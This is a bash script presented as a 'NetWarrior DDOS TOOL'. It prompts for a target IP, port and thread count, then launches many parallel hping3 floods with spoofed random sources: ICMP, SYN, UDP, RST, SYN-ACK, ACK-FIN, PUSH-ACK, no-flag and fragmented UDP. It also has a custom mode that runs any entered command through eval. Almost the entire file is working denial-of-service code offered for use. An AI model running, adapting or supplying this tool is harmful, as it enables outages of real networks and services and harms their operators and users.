#!/bin/bash

# Function to perform an ICMP attack
function icmp_attack {
    local ip=$1
    local threads=$2
    local check_file=$3
    echo "ICMP attack started on $ip with $threads threads." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --icmp --flood --rand-source "$ip" -q >/dev/null 2>&1 &
    done

   
}

# Function to perform a SYN flood attack
function syn_flood_attack {
    local ip=$1
    local port=$2
    local threads=$3
    echo "SYN flood attack started on $ip:$port with $threads threads." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --flood -S -p "$port" --rand-source "$ip" -q >/dev/null 2>&1 &
    done

    
    
}

# Function to perform a UDP flood attack
function udp_flood_attack {
    local ip=$1
    local port=$2
    local threads=$3
    echo "UDP flood attack started on $ip:$port with $threads threads." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --flood --rand-source -p "$port" --udp "$ip" -q >/dev/null 2>&1 &
    done

    
}

function tcp_rst_flood_attack {
    local ip=$1
    local port=$2
    local threads=$3
    echo "Starting TCP RST flood attack on $ip:$port with $threads threads..." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --flood -R -p "$port" --rand-source "$ip" -q >/dev/null 2>&1 &
    done

    echo "TCP RST flood attack started on $ip:$port with $threads threads."
}

function tcp_synack_flood_attack {
    local ip=$1
    local port=$2
    local threads=$3
    echo "TCP SYN-ACK flood attack started on $ip:$port with $threads threads." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --flood -A -S -p "$port" --rand-source "$ip" -q >/dev/null 2>&1 &
    done

   
}

function tcp_ackfin_flood_attack {
    local ip=$1
    local port=$2
    local threads=$3
    echo "TCP ACK-FIN flood attack started on $ip:$port with $threads threads." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --flood -A -F -p "$port" --rand-source "$ip" -q >/dev/null 2>&1 &
    done
    
}

# Function to perform a TCP PUSH-ACK flood attack
function tcp_pushack_flood_attack {
    local ip=$1
    local port=$2
    local threads=$3
    echo "TCP PUSH-ACK flood attack started on $ip:$port with $threads threads." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --flood -P -A -p "$port" --rand-source "$ip" -q >/dev/null 2>&1 &
    done

}

function tcp_noflag_flood_attack {
    local ip=$1
    local port=$2
    local threads=$3
    echo "TCP NO FLAG flood attack started on $ip:$port with $threads threads." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --flood -p "$port" --rand-source "$ip" -q >/dev/null 2>&1 &
    done

}

# Function to perform a UDP fragment flood attack
function udp_fragment_flood_attack {
    local ip=$1
    local port=$2
    local threads=$3
    
    echo "UDP fragment flood attack started on $ip:$port with $threads threads." >> report.txt
    start_custom_date >> report.txt

    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        hping3 --flood --udp -p "$port" --rand-source --data 1472 --frag "$ip" -q >/dev/null 2>&1 &
        
    done
   
}

function custom_flood {
    local c_flood=$1
    local threads=$2
    echo "Custom Flood attack started " >> report.txt
    start_custom_date >> report.txt
    
    for ((i=1; i<=threads; i++)); do
        echo "Starting thread $i"
        eval "$c_flood"

    done


}

function start_custom_date {
    echo "Attack started at $(date '+%Y-%m-%d %H:%M:%S')"
}

function end_custom_date {
    echo "Attack finished at $(date '+%Y-%m-%d %H:%M:%S')"
}


function check_file {
    if [ -f "$1" ]; then
        echo "report.txt file found"
    else
        touch report.txt
        echo "report.txt has been created."
    fi
}



figlet -f big NetWarrior DDOS TOOL

check_file "report.txt"


echo "Do you want to perform a custom attack? (yes/no):"
read custom_attack

if [[ "$custom_attack" == "yes" ]]; then
    #echo "example hping3 --icmp --flood 192.168.1.83 -q >/dev/null 2>&1 & "
    echo "Enter your custom command:"
    read custom_command
    echo "Enter the number of threads: "
    read threads
    protocol="custom"

    
else
    echo "Select the type of flood (udp, syn, icmp, tcp_rst, tcp_syn-ack, tcp_ack-fin, tcp_push-ack, tcp_no-flag, udp_fragment):"
    read protocol
    echo "Enter the number of threads: "
    read threads
    echo "Enter the target IP address: "
    read ipaddress
    echo "Enter the target port: "
    read port
     
fi



case "$protocol" in
    icmp)
        icmp_attack "$ipaddress" "$threads" "$check_file"
        ;;
    syn)
        syn_flood_attack "$ipaddress" "$port" "$threads"
        ;;
    udp)
        udp_flood_attack "$ipaddress" "$port" "$threads"
        ;;
    tcp_rst)
        tcp_rst_flood_attack "$ipaddress" "$port" "$threads"
        ;;
    tcp_syn-ack)
        tcp_synack_flood_attack "$ipaddress" "$port" "$threads"
        ;;
    tcp_ack-fin)
        tcp_ackfin_flood_attack "$ipaddress" "$port" "$threads"
        ;;
    tcp_push-ack)
        tcp_ackfin_flood_attack "$ipaddress" "$port" "$threads"
        ;;
    tcp_no-flag)
        tcp_noflag_flood_attack "$ipaddress" "$port" "$threads"
        ;;
    udp_fragment)
        udp_fragment_flood_attack "$ipaddress" "$port" "$threads"
        ;;
    custom)
        custom_flood "$custom_command" "$threads"
        ;;
    *)
        echo "Invalid protocol selected. Please choose 'udp', 'syn','tcp_syn-ack','tcp_rst','tcp_push-ack' or 'icmp'."
        ;;
esac

while true; do
    echo "Do you want to stop the attack? (yes/no)"
    read cutattack
    cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    ram_usage=$(free | awk '/Mem/{printf("%.2f"), $3/$2 * 100}')
    echo "--------------------------------------"
    echo "Current CPU Usage: $cpu_usage%"
    echo "Current RAM Usage: $ram_usage%"
    echo "--------------------------------------"

    if [ "$cutattack" == "yes" ]; then
        echo "Stopping the attack..."
        pgrep "hping3" | xargs kill -9
        echo "Attack stopped." 
        end_custom_date >> report.txt
        echo "--------------------------------------" >>report.txt
        cat report.txt
        break
    elif [ "$cutattack" == "no" ]; then
        echo "Continuing the attack."
        
    else
        echo "Invalid input. Please enter 'yes' or 'no'."
    fi
done

